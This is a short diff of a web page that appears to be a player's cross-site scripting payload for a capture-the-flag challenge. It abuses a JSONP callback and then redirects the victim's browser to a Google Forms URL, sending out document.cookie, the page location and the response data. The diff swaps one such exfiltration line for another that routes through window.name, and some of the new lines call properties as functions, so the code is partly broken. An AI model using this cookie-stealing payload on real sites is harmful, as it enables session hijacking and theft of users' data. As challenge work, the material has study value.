@@ -14,12 +14,13 @@ layout: xss
         console.log("XSS DATA", data);
         console.log(typeof(data));
         console.log(JSON.stringify(data));
-        try{
-            document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + JSON.stringify(data) + document.cookie + document.location
-        }
-        catch(e){
-            document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=403 mannaggialamadonna"
-        }
+        document.location("https://jason.2021.chall.actf.co/");
+        window.name = "https://jason.2021.chall.actf.co/cookie=" + document.cookie();
+         
+        //document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + JSON.stringify(data) + document.cookie + document.location
+        document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + window.name
+        
+        
     }
     function processWeatherCallback(data) {
         console.log("DATA" + data);
@@ -33,4 +34,4 @@ layout: xss
     document.body.appendChild(script);
 </script>
 
-<script src="https://jason.2021.chall.actf.co/flags?callback=xss_redirect" ></script>
+<script src="https://jason.2021.chall.actf.co/languages?callback=xss_redirect" referrerpolicy="no-referrer"></script>
